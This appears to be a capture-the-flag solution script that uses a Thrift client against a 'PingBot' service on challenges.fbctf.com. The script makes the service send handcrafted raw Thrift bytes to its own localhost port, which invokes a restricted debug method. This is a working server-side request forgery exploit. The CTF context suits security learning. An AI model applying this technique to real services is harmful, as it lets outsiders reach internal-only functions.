import sys
sys.path.append('gen-py')

from ping import PingBot
from ping.ttypes import Proto, Ping, Debug

from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol

def main():
	transport = TSocket.TSocket('challenges.fbctf.com', 9090)
	transport = TTransport.TBufferedTransport(transport)
	protocol = TBinaryProtocol.TBinaryProtocol(transport)
	client = PingBot.Client(protocol)
	transport.open()

	# debug = Debug()
	# debug.dummy = 1337
	# client.pingdebug(debug)

	ping = Ping()
	ping.proto = Proto.TCP
	# ping.host = 'facebook.com:80'
	# ping.data = 'GET / HTTP/1.1\r\n\n'
	ping.host = 'localhost:9090'
	ping.data = '\x80\x01\x00\x01\x00\x00\x00\x09\x70\x69\x6e\x67\x64\x65\x62\x75\x67\x00\x00\x00\x00\x0c\x00\x01\x08\x00\x01\x00\x00\x05\x39\x00\x00'

	pong = client.ping(ping)
	print('code: {}'.format(pong.code))
	print('data: {}'.format(pong.data))

	transport.close()

if __name__ == '__main__':
	try:
		main()
	except Thrift.TException as tx:
		print(tx.message)
